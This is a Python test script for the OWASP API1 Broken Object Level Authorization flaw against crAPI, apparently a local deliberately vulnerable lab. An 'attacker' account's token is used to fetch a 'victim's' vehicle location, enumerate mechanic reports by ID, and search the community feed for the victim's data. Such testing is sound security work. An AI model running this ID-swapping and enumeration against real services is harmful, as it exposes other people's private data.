#!/usr/bin/env python3
"""
OWASP API Security Top 10:2023 - API1: Broken Object Level Authorization (BOLA)
Target: crAPI running on Docker (default port 8888)

Tests whether one authenticated user can access another user's vehicle data,
mechanic reports, and other object-level resources by manipulating IDs.
"""

import requests
import json
import sys

from crapi_config import BASE_URL, USER1_EMAIL, USER1_PASSWORD, USER2_EMAIL, USER2_PASSWORD


# --- Configure two test users below ---


def register_user(email, password, name="Test User"):
    url = f"{BASE_URL}/identity/api/auth/signup"
    payload = {"email": email, "password": password, "name": name, "number": "9876543210"}
    r = requests.post(url, json=payload)
    return r.status_code in (200, 201)


def get_token(email, password):
    url = f"{BASE_URL}/identity/api/auth/login"
    r = requests.post(url, json={"email": email, "password": password})
    if r.status_code == 200:
        return r.json().get("token")
    return None


def get_vehicle_id(token):
    """Retrieve the vehicle UUID for the authenticated user."""
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE_URL}/identity/api/v2/vehicle/vehicles", headers=headers)
    if r.status_code == 200:
        vehicles = r.json()
        if vehicles:
            return vehicles[0].get("uuid")
    return None


def test_bola_vehicle_location(token_attacker, victim_vehicle_id):
    """API1 Test: Can attacker access victim's vehicle location?"""
    headers = {"Authorization": f"Bearer {token_attacker}"}
    url = f"{BASE_URL}/identity/api/v2/vehicle/{victim_vehicle_id}/location"
    r = requests.get(url, headers=headers)
    print(f"\n[API1:BOLA] Vehicle Location Access")
    print(f"  Victim Vehicle ID : {victim_vehicle_id}")
    print(f"  Attacker Request  : GET {url}")
    print(f"  Response Status   : {r.status_code}")
    if r.status_code == 200:
        print(f"  [VULNERABLE] Attacker retrieved victim vehicle location!")
        print(f"  Response Body: {json.dumps(r.json(), indent=2)}")
        return True
    else:
        print(f"  [PROTECTED] Access denied (status {r.status_code})")
        return False


def test_bola_mechanic_report(token_attacker):
    """API1 Test: Can attacker enumerate mechanic report IDs?"""
    headers = {"Authorization": f"Bearer {token_attacker}"}
    print(f"\n[API1:BOLA] Mechanic Report Enumeration")
    vulnerable = False
    for report_id in range(1, 6):
        url = f"{BASE_URL}/workshop/api/mechanic/mechanic_report?report_id={report_id}"
        r = requests.get(url, headers=headers)
        print(f"  report_id={report_id} → HTTP {r.status_code}", end="")
        if r.status_code == 200:
            print(" [VULNERABLE - data returned]")
            vulnerable = True
        else:
            print(" [blocked]")
    return vulnerable


def test_bola_user_profile(token_attacker, victim_email):
    """API1 Test: Can attacker access victim user details?"""
    headers = {"Authorization": f"Bearer {token_attacker}"}
    # crAPI exposes user info at community posts - try fetching by email pattern
    url = f"{BASE_URL}/community/api/v2/community/posts/recent"
    r = requests.get(url, headers=headers)
    print(f"\n[API1:BOLA] Community Posts (data leakage probe)")
    print(f"  Response Status : {r.status_code}")
    if r.status_code == 200:
        data = r.json()
        posts = data.get("posts", [])
        other_user_posts = [p for p in posts if victim_email in str(p)]
        if other_user_posts:
            print(f"  [VULNERABLE] Victim user data found in community feed!")
            return True
        else:
            print(f"  [INFO] Feed returned {len(posts)} posts, no victim data found in this batch")
    return False


def main():
    print("=" * 60)
    print("  crAPI - API1: Broken Object Level Authorization (BOLA)")
    print("=" * 60)
    print(f"\nTarget: {BASE_URL}")

    # Register users (idempotent - ok if already exist)
    print(f"\n[SETUP] Registering test users...")
    register_user(USER1_EMAIL, USER1_PASSWORD, "Alice Attacker")
    register_user(USER2_EMAIL, USER2_PASSWORD, "Bob Victim")

    # Authenticate both users
    print(f"[SETUP] Authenticating...")
    token1 = get_token(USER1_EMAIL, USER1_PASSWORD)
    token2 = get_token(USER2_EMAIL, USER2_PASSWORD)

    if not token1 or not token2:
        print("[ERROR] Could not authenticate one or both users. Check credentials.")
        sys.exit(1)

    print(f"  User1 token: {token1[:30]}...")
    print(f"  User2 token: {token2[:30]}...")

    # Get victim's vehicle ID (User2 is victim, User1 is attacker)
    victim_vehicle_id = get_vehicle_id(token2)
    print(f"\n[SETUP] Victim (User2) vehicle ID: {victim_vehicle_id}")

    results = []

    if victim_vehicle_id:
        results.append(("Vehicle Location BOLA", test_bola_vehicle_location(token1, victim_vehicle_id)))
    else:
        print("\n[WARN] No vehicle found for victim - skipping location BOLA test")
        print("       (Add a vehicle via the crAPI UI first)")

    results.append(("Mechanic Report Enumeration", test_bola_mechanic_report(token1)))
    results.append(("Community Feed Data Leakage", test_bola_user_profile(token1, USER2_EMAIL)))

    print("\n" + "=" * 60)
    print("  RESULTS SUMMARY")
    print("=" * 60)
    for name, vuln in results:
        status = "VULNERABLE ⚠️ " if vuln else "PROTECTED  ✅"
        print(f"  {status}  {name}")
    print()


if __name__ == "__main__":
    main()
